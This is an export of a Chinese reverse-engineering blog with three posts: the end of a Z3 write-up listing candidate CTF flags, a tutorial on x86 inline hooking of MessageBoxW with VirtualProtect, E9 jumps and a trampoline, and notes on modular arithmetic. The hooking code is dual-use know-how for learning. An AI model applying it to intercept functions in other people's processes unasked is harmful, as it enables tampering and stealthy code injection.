class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Such_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3ch_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Su%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;Suc0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;la!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,a!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;,ag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;lag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&quot;l&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;g</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,ag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fla!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3c0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,a!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">f,&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">fl&#x27;!</span><span class="template-variable">&#123;S3%0_A_EZVM&#125;</span></span><br></pre></td></tr></table></figure><p>以上均是解</p><p>补充说明：</p><p>如果想约束某个值只能出现一次，比如{,}，可以用Sum：</p><p>Sum用于计算一系列表达式的和类似于加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s.add(Sum([If(i == BitVecVal(<span class="built_in">ord</span>(<span class="string">&#x27;&#123;&#x27;</span>), <span class="number">8</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]) &lt;= <span class="number">1</span>)</span><br><span class="line">s.add(Sum([If(i == BitVecVal(<span class="built_in">ord</span>(<span class="string">&#x27;&#125;&#x27;</span>), <span class="number">8</span>), <span class="number">1</span>, <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> flag]) &lt;= <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>计算flag中等于括号的值的表达式个数，然后让其小于等于1</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> Z3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 符号执行 </tag>
            
            <tag> z3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内联钩子原理</title>
      <link href="/posts/23a55d41.html"/>
      <url>/posts/23a55d41.html</url>
      
        <content type="html"><![CDATA[<h1>Inline hook</h1><p>Inline hook(内联钩子)是一种再程序运行时<code>修改函数执行流程</code>的技术。通过修改函数原始代码 讲目标函数的执行路径重定向到自定义的代码段，从而实现对目标函数的拦截和修改。</p><p><img src="https://s2.loli.net/2024/01/11/AidLhJUkqP7NXRY.png" alt="image-20240111101326816"></p><p><img src="https://s2.loli.net/2024/01/11/LOXJnCdHrv5UzbA.png" alt="image-20240111103102751"></p><p>对一个函数hook的方法：</p><ol><li>从哪来到哪去</li><li>如何实现跳转<br>E9 + 四字节相对地址（E9是jmp的值）（相当于一共5字节）<br>修改时，如果指令长度大于5，则多余的值会和下一条代码结合为新代码，所以防止崩溃可以写成nop（90）<br>这个相对地址不算这条指令本身</li><li>如何修改代码<br>当已经有一个我们想要hook的函数时，需要先获得它的传入参数，并令hook函数的参数与想要hook的函数的参数类型，个数相同，以保证堆栈平衡<br>为了在运行时修改代码需要virtualprotect函数（windows下）来修改某处的访问权限</li></ol><p>注：实验环境为x86，因为在x64下相对地址的值大于4字节导致不能正常跳转</p><p>那么尝试修改并hook一个函数：</p><h2 id="0x1">0x1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">hooker(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数先调用hooker函数，修改messagebox的内容，然后执行被修改的messagebox函数</p><p>那么hooker函数就要传入messagebox函数的地址，和我们想要修改成的函数的地址，这里的长度可以是固定的，可以不写5</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hooker</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line"><span class="built_in">memcpy</span>(back, src, len);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数外面创建一个备份BYTE back[5];用来保存原始数据，然后用VirtualProtect修改函数前5个字节变成可写属性(0x40),然后备份原始属性到old并修改，核心公式是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>然后改回去</p><p>最后就是实现自己的函数，一定要注意函数的传入参数必须要和原函数相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">mybox</span><span class="params">(_In_opt_ HWND hWnd, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpText, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpCaption, </span></span><br><span class="line"><span class="params"> _In_ UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">lpText = <span class="string">L&quot;hooked&quot;</span>;<span class="comment">//想要修改的效果</span></span><br><span class="line">unhook(MessageBoxW, back, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(hWnd, lpText, lpCaption, uType);</span><br><span class="line">hooker(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里通过去官网直接抄传入参数就可以直接得到参数名<br>同时注意要先解除钩子再调用原函数不然会陷入循环递归</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">unhook</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* back, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line"><span class="built_in">memcpy</span>(src, back, <span class="number">5</span>);</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在调用完目标函数后，还要再次钩住函数，等待下一次调用</p><hr><h2 id="0x2">0x2</h2><p>由于刚刚的hook函数，每次必须要先hook，然后再unhook，十分麻烦。同时，每次调用messagebox的效果都是一样的，如果想要实现显示其它东西，需要另一种方法。</p><p>对于第一个问题：如果不对hook过的函数unhook，那么就会陷入死循环，无限调用自己，如果现在有一个和messagebox的函数效果相同的函数，在hook后，不调用messagebox，而是调用这个函数，就不会内存溢出</p><p>对于第二个问题：如果有一个和messagebox函数相同的函数，那么直接调用那个函数并修改参数就可以显示其它东西。</p><p>因此，只要能构造出一个和我们想hook的函数功能相同的函数就可以解决上面两个问题。</p><img src="https://s2.loli.net/2024/01/22/qxNQeGt8BPVSALM.png" alt="hook前" style="zoom:50%;" /><img src="https://s2.loli.net/2024/01/22/3d5KXVOaSiGCMLx.png" alt="hook后" /><p>那么先构造trampoline函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span>* <span class="title function_">trampoline</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">BYTE* boxin = (BYTE*)VirtualAlloc(<span class="number">0</span>, len + <span class="number">5</span>, <span class="number">0x00001000</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(boxin, src, len);</span><br><span class="line">*(boxin + len) = <span class="number">0xe9</span>;</span><br><span class="line">*(DWORD*)(boxin + len + <span class="number">1</span>) = (BYTE*)src - boxin - <span class="number">5</span>;</span><br><span class="line"><span class="comment">//以下为原hooker的内容</span></span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line"><span class="keyword">return</span> boxin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前4句都是在创建功能相同函数，直接申请内存把messagebox前5个字节复制过来，然后jmp到messagebox里（偷懒）</p><p>第5句到10句的hooker和之前的hooker一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hooker</span><span class="params">(<span class="type">void</span>* src, <span class="type">void</span>* dst, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">DWORD old;</span><br><span class="line">VirtualProtect(src, len, <span class="number">0x40</span>, &amp;old);</span><br><span class="line">*(BYTE*)src = <span class="number">0xE9</span>;</span><br><span class="line"><span class="type">uintptr_t</span> ra = (<span class="type">uintptr_t</span>)dst - (<span class="type">uintptr_t</span>)src - <span class="number">5</span>;</span><br><span class="line">*(DWORD*)((BYTE*)src + <span class="number">1</span>) = ra;</span><br><span class="line">VirtualProtect(src, len, old, &amp;old);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一句return是为了之后使用不被hook的函数</p><p>然后先把相同功能函数的调用写出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">using PFUN = <span class="type">int</span> (WINAPI*)(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType);</span><br><span class="line">PFUN pfun = nullptr;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pfun = (PFUN)trampoline(MessageBoxW, mybox, <span class="number">5</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">MessageBoxW(<span class="number">0</span>, <span class="string">L&quot;Hello&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">pfun(<span class="number">0</span>, <span class="string">L&quot;123123&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后添上hook函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">mybox</span><span class="params">(_In_opt_ HWND hWnd, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpText, </span></span><br><span class="line"><span class="params"> _In_opt_ LPCWSTR lpCaption, </span></span><br><span class="line"><span class="params"> _In_ UINT uType)</span></span><br><span class="line">&#123;</span><br><span class="line">lpText = <span class="string">L&quot;hooked&quot;</span>;</span><br><span class="line">pfun(hWnd, lpText, lpCaption, uType);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样调用时，会先显示3个hook，在最后显示123123.</p><hr><p>完</p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> Hook </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 实践 </tag>
            
            <tag> hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学数学基础2</title>
      <link href="/posts/84e84aaa.html"/>
      <url>/posts/84e84aaa.html</url>
      
        <content type="html"><![CDATA[<h2 id="等价关系">等价关系</h2><p>一：<br>二元关系&quot;=&quot;：</p><ul><li>自反性：对于所有$a\in R$,都有$a=a$</li><li>对称性：对于所有$a,b\in R$,都有$a=b\rightarrow b=a$</li><li>传递性：对于所有$a,b,c\in R$,都有$a=b,b=c\rightarrow a=c$</li></ul><p>二：</p><p>二元关系&quot;$\cong$&quot;:</p><p>同样有自反性，对称性，传递性</p><h3 id="定义">定义</h3><p>设集合S，以及一个定义在S上的二元关系R，若R满足以下性质，则称它为&quot;等价关系&quot;,以元组的形式表示</p><ul><li>自反性：对于所有$a\in S$,都有($a,a)\in R$</li><li>对称性：对于所有$a,b\in S$,都有$(a,a)\in R$</li><li>传递性：对于所有$a,b,c\in S$,都有$(a,b)\in R,(b,c)\in R\rightarrow (a,c)\in R$</li></ul><hr><h2 id="同余">同余</h2><h3 id="定义-2">定义</h3><p>$a \equiv b(\mod n)$：设n为正整数，整数a，b分别模n，如果得到相同的余数(或n|(a-b))，就称a和b在模n的情况下满足同余关系，n被称为模数。同余是一种关系,而不是一种运算</p><h3 id="性质">性质</h3><p>$a \equiv b(\mod n)\iff a=qn+b,\exists q\in Z\rightarrow n|a-b$</p><p>同余是一种<code>等价关系</code>,以下性质可以逆推</p><ul><li>对于同一个除数，两个数的乘积与它们余数的乘积同余。</li><li>对于同一个除数，如果有两个整数同余，那么它们的差就一定能被这个除数整除。</li><li>对于同一个除数，如果两个数同余，那么他们的乘方仍然同余。</li><li>对于同一个除数，若三个数a≡b（mod m），b≡c（mod m），那么a,b,c三个数对于除数m都同余（传递性）。</li><li>对于同一个除数，若四个数a≡b（mod m），c≡d（mod m），那么a±c≡c±d（mod m），（可加减性）。</li><li>对于同一个除数，若四个数a≡b（mod m），c≡d（mod m），那么ac≡cd（mod m），（可乘性）</li></ul><p>同余的运算性质</p><p>若$a \equiv b(\mod n)$，则：</p><ul><li>$a\pm m \equiv b\pm m(\mod n),m\in Z$</li><li>$a* m \equiv b* m(\mod n),m\in Z$</li><li>$a^m \equiv b^m(\mod n),m\in N$</li></ul><p>若同时$c \equiv d(\mod n)$,则：</p><ul><li>$a\pm c \equiv b\pm d(\mod n)$</li><li>$a* c \equiv b* d(\mod n)$</li></ul><hr><h2 id="乘法逆元">乘法逆元</h2><p>倒数：两个数的乘积为1，这两个数互为倒数</p><h3 id="定义-3">定义</h3><p>设$a\in Z,n\in N,如果az\equiv 1(\mod n)$,则称z是模n下a的乘法逆元，记作$a^{-1}=z$</p><p>在模运算下，所有的形如$a^{-1}$的值都可以直接被代换成a在某模数下的乘法逆元，然后继续运算</p><p>只有当一个整数和模数互素的时候，它才会有乘法逆元，即：<br>$$<br>gcd(a,n)=1\iff 模n下有乘法逆元<br>$$<br>求乘法逆元：</p><p>扩展欧几里得算法</p><p>根据最大公约数表示定理：<br>$$<br>gcd(a,n)=1 \rightarrow as+tn = 1<br>$$<br>等式两边同时mod n:<br>$$<br>as \equiv 1 (\mod n)<br>$$<br>∴模n下a的逆元是s</p><p>∴调用gcd函数传入a和n算出的s即为乘法逆元</p><hr><h2 id="一次同余方程">一次同余方程</h2><p>$$<br>a \equiv b(\mod n)<br>$$</p><p>等价于下面这个形式，其中m是a，b，n的公因数<br>$$<br>a/m \equiv b/m(\mod n/m)<br>$$<br>如果gcd(m,n)=1,那么<br>$$<br>a/m \equiv b/m(\mod n)<br>$$<br>才是成立的</p><h3 id="同余下的消去律">同余下的消去律</h3><p>设$a,n\in Z,n&gt;0$,如果$gcd(a,n)=d$,有<br>$$<br>az \equiv az’(\mod n)\rightarrow z \equiv z’(\mod n/d)<br>$$</p><h3 id="同余方程的解">同余方程的解</h3><p>$x \equiv b(\mod n)$的解集：{$b\pm nk$,其中$k=0,1,2,…$}</p><p>同时有规律:<br>原模数为n，终模数为m，设n/m = d,有0~n-1之间解的数量等于d</p><h3 id="一次同余方程有解的条件">一次同余方程有解的条件</h3><p>若gcd(a,n)=d,则<br>$$<br>ax \equiv b(\mod n)有解 \iff d|b<br>$$</p><hr><h2 id="剩余类">剩余类</h2><h3 id="等价类">等价类</h3><p>等价类是等价关系的一种性质，若~是S上的等价关系，对于$a\in S$,定义其等价类为{$x\in S|x\sim a$}</p><p>由于同余关系是等价关系，所以同余中也有等价类，被叫做剩余类</p><h3 id="剩余类-2">剩余类</h3><p>设$a\in Z$,定义其剩余类为{$x\in Z|x\equiv a(\mod 